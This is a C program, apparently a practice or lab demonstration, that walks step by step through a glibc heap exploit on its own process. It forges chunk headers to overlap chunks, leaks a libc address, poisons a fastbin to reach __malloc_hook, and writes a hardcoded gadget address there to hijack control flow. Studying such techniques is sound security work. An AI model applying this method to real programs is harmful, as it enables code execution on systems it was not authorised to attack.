#include <stdlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <ctype.h>
#include <string.h>

void debug_buffer(FILE* fp,const char* file,int lineno, char* pbuf, int size, const char* fmt, ...)
{
    va_list ap;
    int i;
    unsigned char* ptr, *lastptr = NULL;

    fprintf(fp, "[%s:%d][%p][%d:0x%x]",file,lineno,pbuf, size, size);
    if (fmt != NULL) {
        va_start(ap, fmt);
        vfprintf(fp, fmt, ap);
    }

    ptr = (unsigned char*)pbuf;
    lastptr = ptr;
    for (i = 0; i < size; i++) {
        if ((i % 16) == 0) {
            if (i > 0) {
                fprintf(fp, "    ");
            }
            while (lastptr != ptr) {
                if (isprint(*lastptr)) {
                    fprintf(fp, "%c", *lastptr);
                } else {
                    fprintf(fp, ".");
                }
                lastptr ++;
            }
            fprintf(fp, "\n0x%p", (ptr));
        }
        fprintf(fp, " 0x%02x", *ptr);
        ptr ++;
    }
    if (lastptr != ptr) {
        while ( (i % 16) != 0) {
            fprintf(fp, "     ");
            i ++;
        }
        fprintf(fp, "    ");
        while (lastptr != ptr) {
            if (isprint(*lastptr)) {
                fprintf(fp, "%c", *lastptr);
            } else {
                fprintf(fp, ".");
            }
            lastptr ++;
        }
        fprintf(fp,"\n");
    }
    return;
}

void debug_buffer_num(FILE* fp,const char* file,int lineno,char** ppbuf,int size)
{
	int i;
	fprintf(fp,"[%s:%d] ",file,lineno);
	for (i=0;i<size;i++) {
		if ((i%5) == 0 && i > 0)  {
			fprintf(fp,"\n    ");
		}
		fprintf(fp," [%d]%p", i,ppbuf[i]);
	}
	fprintf(fp,"\n");
	return;
}

int main(int argc, char* argv[])
{
    char* p[8] = {0};
    unsigned char payload[0x200];
    unsigned char* plibcbase=NULL;
    unsigned char* pmallochookaddr=NULL;
    unsigned char* pexecaddr=NULL;
    p[0] = malloc(0x20);
    p[1] = malloc(0x20);
    p[2] = malloc(0x20);
    p[3] = malloc(0x20);
    p[4] = malloc(0x80);

    debug_buffer_num(stdout,__FILE__,__LINE__,p,sizeof(p)/sizeof(p[0]));
    free(p[1]);
    free(p[2]);

    debug_buffer_num(stdout,__FILE__,__LINE__,p,sizeof(p)/sizeof(p[0]));
    memset(payload,0,8*6);
    payload[8*5] = 0x31;
    memset(&(payload[8*(5+1)]),0,8*6);
    payload[8*(5+1+5)]=0x31;
    payload[8*(5+1+5+1)]=0xc0;

    memcpy(p[0], payload,8*(5+1+5+1)+1);

    memset(payload,0,8*6);
    payload[8*5] = 0x31;
    memcpy(p[3], payload, 8*(5+1));
    debug_buffer(stdout,__FILE__,__LINE__,p[0],8*(5+1+5+1)+1,"[0] buffer");
    debug_buffer(stdout,__FILE__,__LINE__,p[3],8*(5+1),"[3] buffer");

    p[1] = malloc(0x20);
    p[2] = malloc(0x20);
    debug_buffer_num(stdout,__FILE__,__LINE__,p,sizeof(p)/sizeof(p[0]));

    memset(payload,0,8*6);
    payload[8*5] = 0x91;
    memcpy(p[3], payload, 8*6);
    debug_buffer(stdout,__FILE__,__LINE__,p[3],8*(5+1),"[3] buffer");
    p[5] = malloc(0x80);
    free(p[4]);
    debug_buffer_num(stdout,__FILE__,__LINE__,p,sizeof(p)/sizeof(p[0]));
    debug_buffer(stdout,__FILE__,__LINE__,p[2],8,"[2] buffer");
    debug_buffer(stdout,__FILE__,__LINE__,p[1],8*6,"[1] buffer");
    plibcbase = *((unsigned char**)p[2]);
    plibcbase -= 0x3a5678;
    fprintf(stdout,"plibcbase [%p]\n",plibcbase);
    p[4] = malloc(0x68);
    free(p[4]);
    debug_buffer_num(stdout,__FILE__,__LINE__,p,sizeof(p)/sizeof(p[0]));
    pmallochookaddr = plibcbase;
    pmallochookaddr += 0x3a55ed;
    memcpy(p[2], &pmallochookaddr,8);
    p[4] = malloc(0x60);
    p[6] = malloc(0x60);

    pexecaddr = plibcbase;
    pexecaddr += 0x41374;
    memset(payload,0,3);
    memset(&(payload[3]), 0, 8*2);
    memcpy(&(payload[3+2*8]),&pexecaddr, sizeof(pexecaddr));
    memcpy(p[6], payload,3 + 3*8);

    debug_buffer(stdout,__FILE__,__LINE__,p[6],3 + 3*8,"[6] buffer");

    strncpy(p[4],"/dev/stdin",12);
    debug_buffer_num(stdout,__FILE__,__LINE__,p,sizeof(p)/sizeof(p[0]));

    p[7] = malloc(255);
    return 0;
}